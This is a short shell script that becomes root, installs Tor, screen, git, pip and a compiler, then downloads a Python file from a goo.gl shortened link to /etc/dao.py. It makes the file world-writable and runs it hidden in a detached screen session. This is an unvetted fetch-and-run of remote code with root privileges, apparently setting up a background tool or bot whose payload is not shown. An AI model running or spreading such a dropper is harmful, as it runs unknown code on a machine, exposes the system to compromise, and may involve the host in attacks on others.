sudo su root
pkill yum
yum install -y epel-release
yum install -y tor
yum install -y screen
yum install -y git
yum install -y python-pip
yum install -y gcc-c++
pip install sh
wget https://goo.gl/BWt9AB -O /etc/dao.py
chmod 777 /etc/dao.py
screen -dm python /etc/dao.py